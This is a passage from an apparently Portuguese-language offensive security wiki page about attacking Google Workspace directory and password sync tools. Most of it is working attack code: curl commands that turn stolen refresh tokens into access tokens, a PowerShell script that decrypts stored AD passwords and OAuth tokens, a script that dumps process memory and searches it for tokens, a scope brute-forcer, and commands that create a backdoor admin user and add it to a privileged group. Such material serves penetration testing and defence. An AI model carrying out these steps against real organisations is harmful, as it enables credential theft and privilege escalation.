https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

Alguns exemplos usando alguns desses escopos:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** √© um complemento para o Google Workspace que fornece ferramentas para reten√ß√£o de dados, pesquisa e exporta√ß√£o dos dados da sua organiza√ß√£o armazenados nos servi√ßos do Google Workspace, como Gmail, Drive, Chat e mais.

* Um **Caso** no Google Workspace Vault √© um **container** que organiza e agrupa todas as informa√ß√µes relacionadas a um caso espec√≠fico, investiga√ß√£o ou quest√£o legal. Ele serve como o hub central para gerenciar **Suspens√µes**, **Pesquisas** e **Exporta√ß√µes** relacionadas a essa quest√£o espec√≠fica.
* Uma **Suspens√£o** no Google Workspace Vault √© uma **a√ß√£o de preserva√ß√£o** aplicada a usu√°rios ou grupos espec√≠ficos para **prevenir a exclus√£o ou altera√ß√£o** de seus dados dentro dos servi√ßos do Google Workspace. As suspens√µes garantem que as informa√ß√µes relevantes permane√ßam intactas e n√£o modificadas durante a dura√ß√£o de um caso legal ou investiga√ß√£o.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
Mais [API endpoints na documenta√ß√£o](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

Esta √© uma ferramenta que pode ser usada para **sincronizar seus usu√°rios e grupos do Active Directory com seu Workspace** (e n√£o o contr√°rio at√© o momento da escrita deste texto).

√â interessante porque √© uma ferramenta que exigir√° as **credenciais de um superusu√°rio do Workspace e de um usu√°rio privilegiado do AD**. Portanto, pode ser poss√≠vel encontr√°-la dentro de um servidor de dom√≠nio que estaria sincronizando usu√°rios de tempos em tempos.

{% hint style="info" %}
Para realizar um **MitM** no bin√°rio **`config-manager.exe`**, basta adicionar a seguinte linha no arquivo `config.manager.vmoptions`: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
Observe que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) √© capaz de detectar **GCDS**, obter informa√ß√µes sobre a configura√ß√£o e **at√© mesmo as senhas e credenciais criptografadas**.
{% endhint %}

Al√©m disso, note que o GCDS n√£o sincronizar√° senhas do AD para o Workspace. Se algo, ele apenas gerar√° senhas aleat√≥rias para usu√°rios rec√©m-criados no Workspace, como voc√™ pode ver na imagem a seguir:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5780773316536156543-x.jpg" alt="" width="515"><figcaption></figcaption></figure>

### GCDS - Tokens de Disco & Credenciais do AD

O bin√°rio `config-manager.exe` (o principal bin√°rio do GCDS com GUI) armazenar√° as credenciais do Active Directory configuradas, o token de atualiza√ß√£o e o acesso por padr√£o em um **arquivo xml** na pasta **`C:\Program Files\Google Cloud Directory Sync`** em um arquivo chamado **`Untitled-1.xml`** por padr√£o. Embora tamb√©m possa ser salvo na pasta `Documents` do usu√°rio ou em **qualquer outra pasta**.

Al√©m disso, o registro **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** dentro da chave **`open.recent`** cont√©m os caminhos para todos os arquivos de configura√ß√£o abertos recentemente (xmls). Portanto, √© poss√≠vel **verific√°-lo para encontr√°-los**.

As informa√ß√µes mais interessantes dentro do arquivo seriam:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
Note como o **refresh** **token** e a **senha** do usu√°rio s√£o **criptografados** usando **AES CBC** com uma chave e IV gerados aleatoriamente armazenados em **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (onde quer que a biblioteca Java **`prefs`** armazene as prefer√™ncias) nas chaves de string **`/Encryption/Policy/V2.iv`** e **`/Encryption/Policy/V2.key`** armazenadas em base64.

<details>

<summary>Script Powershell para descriptografar o refresh token e a senha</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
Observe que √© poss√≠vel verificar essas informa√ß√µes checando o c√≥digo java de **`DirSync.jar`** em **`C:\Program Files\Google Cloud Directory Sync`** procurando pela string `exportkeys` (j√° que esse √© o par√¢metro cli que o bin√°rio `upgrade-config.exe` espera para despejar as chaves).
{% endhint %}

Em vez de usar o script do powershell, tamb√©m √© poss√≠vel usar o bin√°rio **`:\Program Files\Google Cloud Directory Sync\upgrade-config.exe`** com o par√¢metro `-exportKeys` e obter a **Key** e **IV** do registro em hex e ent√£o apenas usar algum cyberchef com AES/CBC e essa chave e IV para descriptografar as informa√ß√µes.

### GCDS - Despejando tokens da mem√≥ria

Assim como com GCPW, √© poss√≠vel despejar a mem√≥ria do processo do `config-manager.exe` (√© o nome do bin√°rio principal do GCDS com GUI) e voc√™ poder√° encontrar tokens de refresh e de acesso (se j√° tiverem sido gerados).\
Acho que voc√™ tamb√©m poderia encontrar as credenciais configuradas do AD.

<details>

<summary>Despejar processos config-manager.exe e buscar tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "config-manager" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

### GCDS - Gerando tokens de acesso a partir de tokens de atualiza√ß√£o

Usando o token de atualiza√ß√£o, √© poss√≠vel gerar tokens de acesso utilizando-o e o ID do cliente e o segredo do cliente especificados no seguinte comando:
```bash
curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - Escopos

{% hint style="info" %}
Observe que mesmo tendo um token de atualiza√ß√£o, n√£o √© poss√≠vel solicitar nenhum escopo para o token de acesso, pois voc√™ s√≥ pode solicitar os **escopos suportados pela aplica√ß√£o onde voc√™ est√° gerando o token de acesso**.

Al√©m disso, o token de atualiza√ß√£o n√£o √© v√°lido em todas as aplica√ß√µes.
{% endhint %}

Por padr√£o, o GCSD n√£o ter√° acesso como o usu√°rio a todos os poss√≠veis escopos OAuth, ent√£o usando o seguinte script podemos encontrar os escopos que podem ser usados com o `refresh_token` para gerar um `access_token`:

<details>

<summary>Script Bash para for√ßa bruta de escopos</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

E este √© o resultado que obtive no momento da escrita:
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### Crie um usu√°rio e adicione-o ao grupo `gcp-organization-admins` para tentar escalar no GCP
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
N√£o √© poss√≠vel dar ao novo usu√°rio o papel de Super Admin porque o **token de atualiza√ß√£o n√£o tem escopos suficientes** para conceder os privil√©gios necess√°rios.
{% endhint %}

## Sincroniza√ß√£o do Diret√≥rio do Admin

A principal diferen√ßa entre essa forma de sincronizar usu√°rios com o GCDS √© que o GCDS √© feito manualmente com alguns bin√°rios que voc√™ precisa baixar e executar, enquanto **a Sincroniza√ß√£o do Diret√≥rio do Admin √© sem servidor** gerenciada pelo Google em [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories).

No momento em que este texto foi escrito, este servi√ßo est√° em beta e suporta 2 tipos de sincroniza√ß√£o: do **Active Directory** e do **Azure Entra ID:**

* **Active Directory:** Para configurar isso, voc√™ precisa dar **acesso ao Google ao seu ambiente do Active Directory**. E como o Google s√≥ tem acesso √†s redes do GCP (via **conectores VPC**), voc√™ precisa criar um conector e, em seguida, tornar seu AD dispon√≠vel a partir desse conector, tendo-o em VMs na rede do GCP ou usando Cloud VPN ou Cloud Interconnect. Em seguida, voc√™ tamb√©m precisa fornecer **credenciais** de uma conta com acesso de leitura sobre o diret√≥rio e um **certificado** para contatar via **LDAPS**.
* **Azure Entra ID:** Para configurar isso, basta **fazer login no Azure com um usu√°rio com acesso de leitura** sobre a assinatura do Entra ID em um pop-up exibido pelo Google, e o Google manter√° o token com acesso de leitura sobre o Entra ID.

Uma vez configuradas corretamente, ambas as op√ß√µes permitir√£o **sincronizar usu√°rios e grupos com o Workspace**, mas n√£o permitir√£o configurar usu√°rios e grupos do Workspace para o AD ou EntraID.

Outras op√ß√µes que ser√£o permitidas durante essa sincroniza√ß√£o s√£o:

* Enviar um e-mail para os novos usu√°rios para fazer login
* Alterar automaticamente seu endere√ßo de e-mail para o usado pelo Workspace. Assim, se o Workspace estiver usando `@hacktricks.xyz` e os usu√°rios do EntraID usarem `@carloshacktricks.onmicrosoft.com`, `@hacktricks.xyz` ser√° usado para os usu√°rios criados na conta.
* Selecionar os **grupos contendo os usu√°rios** que ser√£o sincronizados.
* Selecionar **grupos** para sincronizar e criar no Workspace (ou indicar para sincronizar todos os grupos).

### De AD/EntraID -> Google Workspace (& GCP)

Se voc√™ conseguir comprometer um AD ou EntraID, ter√° controle total sobre os usu√°rios e grupos que ser√£o sincronizados com o Google Workspace.\
No entanto, observe que as **senhas** que os usu√°rios podem estar usando no Workspace **podem ser as mesmas ou n√£o**.

#### Atacando usu√°rios

Quando a sincroniza√ß√£o acontece, pode sincronizar **todos os usu√°rios do AD ou apenas os de uma OU espec√≠fica** ou apenas os **usu√°rios membros de grupos espec√≠ficos no EntraID**. Isso significa que, para atacar um usu√°rio sincronizado (ou criar um novo que seja sincronizado), voc√™ precisar√° primeiro descobrir quais usu√°rios est√£o sendo sincronizados.

* Os usu√°rios podem estar **reutilizando a senha ou n√£o do AD ou EntraID**, mas isso significa que voc√™ precisar√° **comprometer as senhas dos usu√°rios para fazer login**.
* Se voc√™ tiver acesso aos **e-mails** dos usu√°rios, poder√° **alterar a senha do Workspace de um usu√°rio existente**, ou **criar um novo usu√°rio**, esperar at√© que ele seja sincronizado e configurar a conta.

Uma vez que voc√™ acesse o usu√°rio dentro do Workspace, ele pode receber algumas **permiss√µes por padr√£o**.

#### Atacando Grupos

Voc√™ tamb√©m precisa descobrir primeiro quais grupos est√£o sendo sincronizados. Embora exista a possibilidade de que **TODOS** os grupos estejam sendo sincronizados (j√° que o Workspace permite isso).

{% hint style="info" %}
Observe que, mesmo que os grupos e as associa√ß√µes sejam importados para o Workspace, os **usu√°rios que n√£o est√£o sincronizados na sincroniza√ß√£o de usu√°rios n√£o ser√£o criados** durante a sincroniza√ß√£o de grupos, mesmo que sejam membros de qualquer um dos grupos sincronizados.
{% endhint %}

Se voc√™ souber quais grupos do Azure est√£o sendo **atribu√≠dos permiss√µes no Workspace ou GCP**, poder√° simplesmente adicionar um usu√°rio comprometido (ou rec√©m-criado) nesse grupo e obter essas permiss√µes.

H√° outra op√ß√£o para abusar de grupos privilegiados existentes no Workspace. Por exemplo, o grupo `gcp-organization-admins@<workspace.email>` geralmente tem altos privil√©gios sobre o GCP.

Se a sincroniza√ß√£o de, por exemplo, EntraID, para o Workspace estiver **configurada para substituir o dom√≠nio** do objeto importado **pelo e-mail do Workspace**, ser√° poss√≠vel para um atacante criar o grupo `gcp-organization-admins@<entraid.email>` no EntraID, adicionar um usu√°rio a esse grupo e esperar at√© que a sincroniza√ß√£o de todos os grupos aconte√ßa.\
**O usu√°rio ser√° adicionado ao grupo `gcp-organization-admins@<workspace.email>`, escalando privil√©gios no GCP.**

### De Google Workspace -> AD/EntraID

Observe que o Workspace requer credenciais com acesso somente leitura sobre o AD ou EntraID para sincronizar usu√°rios e grupos. Portanto, n√£o √© poss√≠vel abusar do Google Workspace para realizar qualquer altera√ß√£o no AD ou EntraID. Portanto, **isso n√£o √© poss√≠vel** neste momento.

Eu tamb√©m n√£o sei onde o Google armazena as credenciais do AD ou o token do EntraID e voc√™ **n√£o pode recuper√°-los reconfigurando a sincroniza√ß√£o** (eles n√£o aparecem no formul√°rio da web, voc√™ precisa fornec√™-los novamente). No entanto, pela web, pode ser poss√≠vel abusar da funcionalidade atual para **listar usu√°rios e grupos**.

## GPS - Sincroniza√ß√£o de Senhas do Google

Este √© o bin√°rio e servi√ßo que o Google oferece para **manter sincronizadas as senhas dos usu√°rios entre o AD** e o Workspace. Sempre que um usu√°rio altera sua senha no AD, ela √© definida para o Google.

Ele √© instalado em `C:\Program Files\Google\Password Sync`, onde voc√™ pode encontrar o bin√°rio `PasswordSync.exe` para configur√°-lo e `password_sync_service.exe` (o servi√ßo que continuar√° em execu√ß√£o).

### GPS - Configura√ß√£o

Para configurar este bin√°rio (e servi√ßo), √© necess√°rio **dar acesso a um principal Super Admin no Workspace**:

* Fazer login via **OAuth** com o Google e, em seguida, ele **armazenar√° um token no registro (criptografado)**
* Dispon√≠vel apenas em Controladores de Dom√≠nio com GUI
* Fornecendo algumas **credenciais de Conta de Servi√ßo do GCP** (arquivo json) com permiss√µes para **gerenciar os usu√°rios do Workspace**
* Ideia muito ruim, pois essas credenciais nunca expiram e podem ser mal utilizadas
* Ideia muito ruim dar acesso a uma SA sobre o workspace, pois a SA pode ser comprometida no GCP e ser√° poss√≠vel pivotar para o Workspace
* O Google exige isso para controladores de dom√≠nio sem GUI
* Essas credenciais tamb√©m s√£o armazenadas no registro

Em rela√ß√£o ao AD, √© poss√≠vel indicar que use o **contexto de aplicativos atual, an√¥nimo ou algumas credenciais espec√≠ficas**. Se a op√ß√£o de credenciais for selecionada, o **nome de usu√°rio** √© armazenado dentro de um arquivo no **disco** e a **senha** √© **criptografada** e armazenada no **registro**.

### GPS - Extraindo senha e token do disco

{% hint style="success" %}
Observe que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) √© capaz de detectar **GPS**, obter informa√ß√µes sobre a configura√ß√£o e **at√© mesmo descriptografar a senha e o token**.
{% endhint %}

No arquivo **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** √© poss√≠vel encontrar parte da configura√ß√£o, como o **`baseDN`** do AD configurado e o **`username`** cujas credenciais est√£o sendo usadas.

No registro **`HKLM\Software\Google\Google Apps Password Sync`** √© poss√≠vel encontrar o **token de atualiza√ß√£o criptografado** e a **senha criptografada** para o usu√°rio do AD (se houver). Al√©m disso, se em vez de um token, algumas **credenciais de SA** forem usadas, tamb√©m √© poss√≠vel encontr√°-las criptografadas nesse endere√ßo do registro. Os **valores** dentro deste registro s√£o apenas **acess√≠veis** por **Administradores**.

A **senha** criptografada (se houver) est√° dentro da chave **`ADPassword`** e √© criptografada usando a API **`CryptProtectData`**. Para descriptograf√°-la, voc√™ precisa ser o mesmo usu√°rio que configurou a sincroniza√ß√£o de senhas e usar esta **entropia** ao usar a **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

O token criptografado (se houver) est√° dentro da chave **`AuthToken`** e √© criptografado usando a API **`CryptProtectData`**. Para descriptograf√°-lo, voc√™ precisa ser o mesmo usu√°rio que configurou a sincroniza√ß√£o de senhas e usar esta **entropia** ao usar a **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Al√©m disso, tamb√©m √© codificado usando base32hex com o dicion√°rio **`0123456789abcdefghijklmnopqrstv`**.

